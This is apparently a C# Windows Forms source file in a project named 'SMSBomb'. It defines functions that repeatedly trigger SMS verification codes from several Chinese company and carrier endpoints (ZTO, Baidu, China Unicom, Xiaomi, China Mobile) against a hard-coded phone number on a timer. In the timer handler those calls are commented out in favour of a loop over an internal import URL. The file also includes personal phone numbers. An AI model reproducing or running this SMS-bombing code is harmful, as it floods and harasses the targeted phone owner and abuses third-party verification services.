using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace SMSBomb
{
    public partial class Form1 : Form
    {
        private int SendCount = 0;
        private string mobile = string.Empty;
        private string LogConfig = @"D:\SyncBranchLog.log";
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            timer1.Interval = 10000;
            //Guid? g = null;
            //var str = g?.ToString() + "3333" + "44444";
            //MessageBox.Show(str);
        }
        public void WriteLog(string content)
        {
            StreamWriter sw = File.AppendText(LogConfig);
            sw.WriteLine(content);
            sw.Close();
        }
        //中通快递
        private bool SendMessage_ZT()
        {
            var jo = new JObject();
            jo.Add("mobile", mobile);
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/json; charset=UTF-8");
            var res = wc.UploadString("https://hdgateway.zto.com/auth_account_sendLoginOrRegisterSmsVerifyCode", "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        private bool SendMessage_BD()
        {
            var jo = new JObject();
            jo.Add("owner_phone", mobile);
            jo.Add("type", 1);
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded");
            var res = wc.UploadString("https://xiongzhang.baidu.com/account/register/sendsms?ajax=1&bdstoken=05b1ce4ca33e79ab9eb212d44312740f", "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        /// <summary>
        /// 只适用于联通手机
        /// </summary>
        /// <returns></returns>
        private bool SendMessage_LT()
        {
            var stamp = (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000;
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            var res = wc.UploadString("https://uac.10010.com/portal/Service/SendMSG?req_time=" + stamp + "&mobile=" + mobile + "&_=" + stamp, "GET");
            var resObj = JObject.Parse(res);
            if (resObj["resultCode"].ToString() == "0000")
                CounterAndUpdate();
            return true;
        }
        private bool SendMessage_XM()
        {
            var stamp = (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000;
            var jo = new JObject();
            jo.Add("sid", "passport");
            jo.Add("user", mobile);
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/json; charset=UTF-8");
            var res = wc.UploadString("https://account.xiaomi.com/pass/sendServiceLoginTicket?_dc=" + stamp, "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        private bool SendMessage_YD()
        {
            var jo = new JObject();
            jo.Add("userName", "15836470842");
            jo.Add("type", "01");
            jo.Add("channelID", "12034");
            var wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            wc.Headers.Add(HttpRequestHeader.Accept, "json");
            wc.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded; charset=UTF-8");
            var res = wc.UploadString("https://login.10086.cn/sendRandomCodeAction.action", "POST", jo.ToString());
            var resObj = JObject.Parse(res);
            if (resObj["message"].ToString() == "发送成功")
                CounterAndUpdate();
            return true;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            //SendMessage_BD();
            //SendMessage_ZT();
            //SendMessage_LT();
            //SendMessage_YD();
            //SendMessage_XM();
            GetResult("http://api.super.com.cn/test/brands/branch/import/by/mongo/4D87CDD4-5296-456B-B22E-B08F0164040D");
        }
        private void CounterAndUpdate()
        {
            SendCount++;
            label2.Text = SendCount.ToString();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.Text = "15090613628";
            //textBox1.Text = "18521565465";
            mobile = textBox1.Text.ToString();
        }
        public void GetResult(string url)
        {
            if (SendCount <= 75)
            {
                WebClient client = new WebClient();
                var result = Encoding.UTF8.GetString(client.DownloadData(url));
                WriteLog(result);
                CounterAndUpdate();
            }
            else
            {
                timer1.Enabled = false;
                MessageBox.Show("一百个网点导入完毕！");
            }
        }
    }
}
